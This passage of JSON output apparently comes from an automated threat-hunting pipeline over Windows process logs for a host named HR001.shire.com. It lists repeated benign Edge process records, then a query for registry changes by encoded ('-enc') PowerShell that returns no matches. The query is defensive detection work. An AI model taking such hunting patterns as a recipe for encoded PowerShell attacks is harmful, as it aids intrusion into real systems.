{\"TimeCreated\": \"2019-05-14T22:31:38.434Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.435Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.435Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.435Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.435Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\ \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What registry keys were modified by the powershell.exe process (ParentCommandLine containing \"-enc\") between 2019-05-14T22:30:00Z and 2019-05-14T22:40:00Z?",
        "evidence": "No matching records found for: What registry keys were modified by the powershell.exe process (ParentCommandLine containing \"-enc\") between 2019-05-14T22:30:00Z and 2019-05-14T22:40:00Z?"
      }
    ],
    "grounding_rounds": 0,
    "grounding_unsupported": [],
    "zero_evidence_rounds": 0
  },
